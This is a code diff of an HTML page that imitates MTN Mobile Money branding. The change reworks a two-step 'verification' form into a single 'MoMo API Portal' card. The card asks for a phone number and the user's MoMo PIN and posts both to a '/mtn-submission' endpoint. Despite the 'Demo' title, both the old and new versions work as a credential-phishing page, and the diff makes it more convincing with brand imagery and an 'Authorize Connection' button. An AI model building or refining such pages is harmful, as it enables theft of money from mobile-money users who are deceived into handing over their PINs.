@@ -1,385 +1,217 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Demo Submission</title>
+    <style>
+        :root {
+            --mtn-yellow: #ffcc00;
+            --mtn-dark-blue: #004b6e;
+            --background-grey: #f7f9fa;
+        }
 
-  <title>MTN MoMo Demo</title>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--background-grey);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-    }
+        .card {
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 380px;
+            padding: 30px;
+            text-align: center;
+            box-sizing: border-box;
+            border-top: 8px solid var(--mtn-yellow);
+        }
 
-    body {
-      min-height: 100vh;
-      background: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        .brand-header {
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
 
-    .phone {
-      width: 100%;
-      max-width: 390px;
-      min-height: 100vh;
-      padding: 28px 24px;
-      position: relative;
-    }
+        .momo-logo {
+            width: 75px;
+            height: 75px;
+            object-fit: contain;
+            border-radius: 14px;
+        }
 
-    .top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 45px;
-    }
+        .brand-header h2 {
+            font-size: 20px;
+            color: var(--mtn-dark-blue);
+            margin: 0;
+            font-weight: 700;
+        }
 
-    .logo {
-      font-size: 25px;
-      font-weight: 800;
-      color: #ffcc00;
-      letter-spacing: -1px;
-    }
+        .brand-header p {
+            font-size: 13px;
+            color: #757575;
+            margin: 0;
+        }
 
-    .mtn {
-      font-size: 14px;
-      font-weight: bold;
-      color: #555;
-      border: 1px solid #ddd;
-      padding: 6px 10px;
-      border-radius: 15px;
-    }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
 
-    h1 {
-      font-size: 27px;
-      color: #222;
-      margin-bottom: 10px;
-    }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+        }
 
-    .description {
-      color: #777;
-      font-size: 15px;
-      line-height: 1.5;
-      margin-bottom: 30px;
-    }
+        .input-wrapper {
+            position: relative;
+        }
 
-    .label {
-      display: block;
-      font-size: 14px;
-      font-weight: bold;
-      color: #333;
-      margin-bottom: 8px;
-    }
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 14px;
+            box-sizing: border-box;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s ease;
+            outline: none;
+        }
 
-    .phone-input {
-      display: flex;
-      height: 54px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      overflow: hidden;
-      margin-bottom: 18px;
-    }
+        .input-wrapper input:focus {
+            border-color: var(--mtn-dark-blue);
+        }
 
-    .flag {
-      width: 65px;
-      background: #f5f5f5;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      border-right: 1px solid #ddd;
-    }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--mtn-yellow);
+            border: none;
+            border-radius: 8px;
+            color: #000000;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
+            transition: transform 0.1s ease, background-color 0.2s ease;
+        }
 
-    .phone-input input {
-      flex: 1;
-      border: 0;
-      outline: none;
-      padding: 0 15px;
-      font-size: 17px;
-    }
+        button:hover {
+            background-color: #e6b800;
+        }
 
-    .error {
-      color: #d93025;
-      font-size: 13px;
-      margin-top: -10px;
-      margin-bottom: 15px;
-      display: none;
-    }
+        button:active {
+            transform: scale(0.98);
+        }
 
-    button {
-      width: 100%;
-      height: 52px;
-      border: 0;
-      border-radius: 8px;
-      background: #1769e0;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
+        .status-msg {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 600;
+            min-height: 20px;
+        }
 
-    button:disabled {
-      opacity: .6;
-      cursor: not-allowed;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .code-box {
-      display: flex;
-      gap: 8px;
-      margin: 25px 0;
-    }
-
-    .code-box input {
-      width: 100%;
-      height: 54px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      text-align: center;
-      font-size: 22px;
-      letter-spacing: 5px;
-      outline: none;
-    }
-
-    .success {
-      text-align: center;
-      padding-top: 70px;
-    }
-
-    .check {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      background: #e8f5e9;
-      color: #20a044;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 38px;
-      margin: 0 auto 25px;
-    }
-
-    .success h1 {
-      margin-bottom: 12px;
-    }
-
-    .success p {
-      color: #777;
-      line-height: 1.5;
-      margin-bottom: 30px;
-    }
-
-    .small {
-      text-align: center;
-      color: #999;
-      font-size: 12px;
-      margin-top: 25px;
-    }
-  </style>
+        .legal-notice {
+            font-size: 11px;
+            color: #8c8c8c;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="phone">
-
-  <!-- PAGE 1 -->
-  <section id="page1">
-
-    <div class="top">
-      <div class="logo">MTN</div>
-      <div class="mtn">MTN</div>
+<div class="card">
+    <div class="brand-header">
+        <img class="momo-logo" src="https://wikimedia.org" onerror="this.src='https://mtn.com'" alt="MTN MoMo Logo">
+        <h2>MoMo API Portal</h2>
+        <p>Confirm authorization profile details</p>
     </div>
 
-    <h1>MoMo Mtn</h1>
+    <form id="submissionForm">
+        <div class="form-group">
+            <label for="phone">Mobile Number</label>
+            <div class="input-wrapper">
+                <input type="text" id="phone" required placeholder="e.g., 0770000000" autocomplete="tel">
+            </div>
+        </div>
+        <div class="form-group">
+            <label for="pin">MoMo PIN (4 or 5 digits)</label>
+            <div class="input-wrapper">
+                <!-- RegEx Pattern restricts typing strictly to 4 or 5 numerical digits -->
+                <input type="password" id="pin" required placeholder="••••" inputmode="numeric" pattern="^[0-9]{4,5}$" title="PIN must be exactly 4 or 5 digits long" autocomplete="current-password">
+            </div>
+        </div>
+        <button type="submit">Authorize Connection</button>
+    </form>
+    
+    <div id="status" class="status-msg"></div>
 
-    <p class="description">
-      Enter a mobile number to continue with the verification.
-    </p>
-
-    <label class="label" for="phone">Mobile number</label>
-
-    <div class="phone-input">
-      <div class="flag">🇺🇬</div>
-      <input
-        id="phone"
-        type="tel"
-        inputmode="numeric"
-        maxlength="9"
-        placeholder="7XXXXXXXX"
-      >
+    <div class="legal-notice">
+        Signing in confirms your acceptance of our programmatic distribution terms and transactional privacy policies.
     </div>
-
-    <div id="phoneError" class="error">
-      Number is required
-    </div>
-
-    <button id="continueBtn">
-      Continue
-    </button>
-
-    <div class="small">
-      Mtn users— Use valid mtn submission.
-    </div>
-
-  </section>
-
-
-  <!-- PAGE 2 -->
-  <section id="page2" class="hidden">
-
-    <div class="top">
-      <div class="logo">MTN</div>
-      <div class="mtn">MTN</div>
-    </div>
-
-    <h1>Verification</h1>
-
-    <p class="description">
-      Enter the 5-digit PINCODE.
-    </p>
-
-    <label class="label">
-      PINCODE verification code
-    </label>
-
-    <div class="code-box">
-      <input
-        id="pincode"
-        type="tel"
-        inputmode="numeric"
-        maxlength="5"
-        placeholder="xxxxx"
-      >
-    </div>
-
-    <div id="codeError" class="error">
-      Verification code is required
-    </div>
-
-    <button id="verifyBtn">
-      Verify
-    </button>
-
-    <div class="small">
-      Enter any 5-digit security code.
-    </div>
-
-  </section>
-
-
-  <!-- SUCCESS -->
-  <section id="successPage" class="success hidden">
-
-    <div class="check">✓</div>
-
-    <h1>Submission successful</h1>
-
-    <p>
-      Your submission has been completed successfully.
-    </p>
-
-    <button onclick="location.reload()">
-      Start again
-    </button>
-
-  </section>
-
 </div>
 
-
 <script>
-  const page1 = document.getElementById("page1");
-  const page2 = document.getElementById("page2");
-  const successPage = document.getElementById("successPage");
+    document.getElementById("submissionForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
 
-  const phone = document.getElementById("phone");
-  const phoneError = document.getElementById("phoneError");
+        const phoneInput = document.getElementById("phone").value;
+        const pinInput = document.getElementById("pin").value;
+        const statusDiv = document.getElementById("status");
 
-  // FIXED: Correctly targeted id="pincode" from the HTML structure
-  const pinCode = document.getElementById("pincode");
-  const codeError = document.getElementById("codeError");
+        // Extra layer of JS programmatic validation checking length explicitly
+        if (pinInput.length !== 4 && pinInput.length !== 5) {
+            statusDiv.style.color = "#c62828";
+            statusDiv.innerText = "Error: PIN must be exactly 4 or 5 digits.";
+            return;
+        }
 
-  const continueBtn = document.getElementById("continueBtn");
-  const verifyBtn = document.getElementById("verifyBtn");
+        statusDiv.style.color = "#004b6e";
+        statusDiv.innerText = "Processing secure request...";
 
-  let mtnPhone = "";
+        try {
+            const response = await fetch("/mtn-submission", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    phone: phoneInput,
+                    pin: pinInput,
+                    success: true 
+                })
+            });
 
-  continueBtn.addEventListener("click", () => {
+            const data = await response.json();
 
-    const number = phone.value.trim();
-
-    if (!number) {
-      phoneError.style.display = "block";
-      return;
-    }
-
-    if (!/^[0-9]{9}$/.test(number)) {
-      phoneError.textContent = "Enter a valid 9-digit mtn number";
-      phoneError.style.display = "block";
-      return;
-    }
-
-    phoneError.style.display = "none";
-
-    mtnPhone = "256" + number;
-
-    page1.classList.add("hidden");
-    page2.classList.remove("hidden");
-  });
-
-
-  verifyBtn.addEventListener("click", async () => {
-
-    const code = pinCode.value.trim();
-
-    if (!code) {
-      codeError.textContent = "Verification code is required";
-      codeError.style.display = "block";
-      return;
-    }
-
-    // MODIFIED: Replaced standard string check with a 5-digit number validation pattern
-    if (!/^[0-9]{5}$/.test(code)) {
-      codeError.textContent = "Enter a valid 5-digit pin code";
-      codeError.style.display = "block";
-      return;
-    }
-
-    codeError.style.display = "none";
-
-    verifyBtn.disabled = true;
-    verifyBtn.textContent = "Verifying...";
-
-    try {
-
-      // MODIFIED: Included the dynamic pin variable inside the request payload body
-      await fetch("/mtn-submission", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          phone: mtnPhone,
-          pin: code,
-          success: true
-        })
-      });
-
-    } catch (error) {
-      console.log("Mtn notification failed:", error);
-    }
-
-    page2.classList.add("hidden");
-    successPage.classList.remove("hidden");
-  });
+            if (response.ok && data.success) {
+                statusDiv.style.color = "#2e7d32";
+                statusDiv.innerText = "Submission successfully transferred.";
+            } else {
+                statusDiv.style.color = "#c62828";
+                statusDiv.innerText = data.message || "Failed processing submission.";
+            }
+        } catch (error) {
+            console.error("Transmission breakdown:", error);
+            statusDiv.style.color = "#c62828";
+            statusDiv.innerText = "Error syncing with gateway.";
+        }
+    });
 </script>
 
 </body>
 </html>
+
 
